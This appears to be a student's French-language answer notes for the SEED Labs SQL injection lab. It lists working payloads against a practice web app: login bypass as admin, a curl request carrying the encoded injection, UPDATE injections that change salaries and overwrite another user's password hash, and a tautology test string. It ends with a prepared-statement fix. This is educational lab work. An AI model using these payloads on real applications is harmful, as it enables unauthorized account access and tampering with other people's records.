
``WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";```
Task 2.1 : username = admin' -- (avec un espace à la fin)

2.2 : curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20--%20'

2.3 : pas possible : voir doc de query

3 . alice' --

3.3. alice', SALARY='1' WHERE Name LIKE 'ALICE' -- 

3.4. ', SALARY='1' WHERE Name LIKE 'Boby' -- 

3.5. https://www.sha1.fr/
Password  : 'boss' en clair => '05b1f356646c24bf1765f6f1b65aea3bde7247e1' en sha1

dans le nickname : ', PASSWORD='05b1f356646c24bf1765f6f1b65aea3bde7247e1' WHERE Name LIKE 'Boby' -- 

Puis Logout, et log in avec Username : Boby et Password : boss

Task 4. 

```
$result = $conn->prepare("SELECT id, name, eid, salary, ssn 
FROM credential WHERE name= ? and Password= ? ");

// Bind parameters to query
$result->bind_param("ss", $input_uname, $hashed_pwd);
$result->execute();
$result->bind_result($id, $name, $eid, $salary, $ssn);

if ($result->fetch()) {
// do something here with data
}
```

4. Guidelines : 
A tester : SELECT * from credential WHERE name='' or 1=1; # and password='password';
